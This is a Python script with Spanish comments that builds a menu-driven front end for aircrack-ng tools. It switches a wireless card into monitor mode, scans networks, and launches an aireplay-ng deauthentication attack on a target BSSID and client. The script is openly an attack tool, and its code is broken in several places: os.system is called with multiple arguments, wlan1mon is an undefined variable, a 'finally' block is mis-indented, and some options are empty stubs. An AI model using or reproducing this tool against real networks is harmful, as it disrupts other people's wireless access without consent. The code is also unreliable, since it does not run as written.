#Importamos dos modulos que nos va a estar sirviendo durante todo el proyecto
import os
import time 

#Definimos el menú de airmon-ng para la interfaz a utilizar en el programa
def airmon(): 
    os.system ("airmon-ng")
    time.sleep(2)
    interfaz = str(input ("Escribe la interfaz: "))
    os.system ("airmon-ng start ", interfaz)
    menu1()
    
#Definimos el Menú
def airodump(): 
    os.system("clear")
    print ("1- Sólo escaner")
    print ("2- Escaneo especificado")
    print ("0- Menú principal")
    try: 
        d = str (input("Qué desea hacer ?: "))  
        if d == "1":
            os.system("clear")
            save_data = str (input("Quieres guardar los datos capturados ?(y/n): "))
            if save_data.upper() == "Y": 
                save_path = str (input("Introduce la dirección para guardar la información: "))
                time.sleep(2)
                os.system("airodump-ng ")
        elif d == "2":
            os.system("clear")
            channel = str (input ("- Especificar canal: "))
            bssid_yn = str(input("- Especificar BSSID: "))
            essid_yn = str (input("- Especificar ESSID: "))
            encrypt = str (input ("- Especificar tipo de encriptado: "))
            time.sleep(2)
            os.system("clear")
            print ("- Canal: " + channel)
            print ("- BSSID: " + bssid_yn )
            print ("- ESSID: " + essid_yn)
            print ("ENCRYPT: " + encrypt)
            confirm = (str(input ("Is that correct ? (y/n): ")).upper()
            
            if confirm == "Y": 
                try:
                    os.system("clear")
                    os.system ("airodump-ng ", wlan1mon, " --bssid ", bssid_yn, " --essid ", essid_yn, " --channel ", channel, " --encrypt ", encrypt) 
                except KeyboardInterrupt:  
                    print ("La operación se detuvo :)")
                    time.sleep(2)
                finally: 
                airodump()
            elif confirm =="N": 
                print ("Volviendo al menú :)")
                airodump()
            else: 
                print ("Lo introducido no es válido :)")
                airodump()
        elif d =="0": 
            menu1()
    except: 
        print ("Ocurrió un error")
        airodump()

#Este es el menú de aireplay-ng para realizar los ataques
def aireplay(): 
    os.system("clear")
    print ("Ataque Aireplay")
    print ("1- Ataque personalizado")
    print ("2- Desautenticar la Red")
    print ("0- Menú principal")
    time.sleep(2)
    play_option = str (input ("Ingresa la opción que quiera realizar: "))
    try: 
        if play_option == "1": 
            try: 
                time.sleep(2)
                os.system ("clear")
                pack = str (input ("Ingresa la cantidad de paquetes --deauth(0 es infinito): "))
                bssid = str (input ("Ingresa el BSSID atacado: "))
                client = str (input ("Ingresa el cliente atacado: "))    
                interfaz = str (input ("Ingrsa la interfaz a utilizar: "))
                time.sleep(2)
                os.system("clear")
                print ("- Paquetes: ", pack)
                print ("- BSSID: ", bssid)
                print ("- Client: ", client)
                print ("- Interfaz: ", interfaz)
                confirm = (str (input ("Es la información correcta ?(y/n): "))).upper()
                if confirm =="Y": 
                    try: 
                        os.system ("clear")
                        os.system ("aireplay-ng -0 ",pack," -a ", bssid, " -c ", client, " ", interfaz )
                    except KeyboardInterrupt: 
                        print ("Se detuvo el ataque :)")
                    except: 
                        print ("Ocurrió un error :)")
                    finally: 
                        aireplay()                          
                elif confirm == "N": 
                    aireplay()
                else: 
                    print ("Lo introducido no es válido :)")
                    aireplay()
            except: 
                print ("Ocurrió un Error :)")
                aireplay()     
        elif play_option == "2": 
            pass
        elif play_option == "0": 
            menu1()
        else: 
            print ("No hay coincidencias :) ")
            aireplay()
    except KeyboardInterrupt: 
        print ("Se detuvo el programa :) ")
        aireplay()
    

def airbase(): 
    pass


def menu1(): 
    print ("1- Airmon-ng")
    print ("2- Airodump-ng")
    print ("3- Aireplay-ng")
    print ("4- Airbase-ng")
    print ("")
    time.sleep(2)
    r = str (input("Elija una opcion: "))
    if r=="1":
        airmon()
    elif r=="2":
        airodump()
    elif r=="3":
        aireplay()
    elif r=="4":
        airbase()
     
menu1()
